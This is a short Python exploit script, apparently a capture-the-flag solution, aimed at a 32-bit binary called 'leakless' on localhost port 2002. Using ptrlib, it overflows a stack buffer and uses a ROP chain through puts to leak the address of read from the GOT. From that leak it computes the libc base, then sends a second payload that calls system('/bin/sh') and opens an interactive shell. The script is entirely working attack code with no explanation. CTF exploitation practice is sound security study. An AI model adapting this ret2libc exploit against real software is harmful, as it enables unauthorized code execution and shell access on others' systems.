from ptrlib import *

sock = Socket("localhost", 2002)
elf = ELF("./leakless")
libc = ELF("./libc6_2.26-0ubuntu2.1_i386.so")

plt_puts = 0x080483f0
rop_pop_ebx = 0x080483ad

payload = b"A" * 0x4c
payload += p32(plt_puts)
payload += p32(rop_pop_ebx)
payload += p32(elf.got("read"))
payload += p32(elf.symbol('feedme'))
sock.send(payload)

addr_read = u32(sock.recvline()[:4])
libc_base = addr_read - libc.symbol("read")
addr_system = libc_base + libc.symbol("system")
addr_binsh  = libc_base + next(libc.find("/bin/sh"))
addr_exit   = libc_base + libc.symbol("exit")
dump("<read> = " + hex(addr_read))
dump("libc base = " + hex(libc_base))

payload = b"A" * 0x4c
payload += p32(addr_system)
payload += p32(rop_pop_ebx)
payload += p32(addr_binsh)
payload += p32(addr_exit)
sock.send(payload)

sock.interactive()
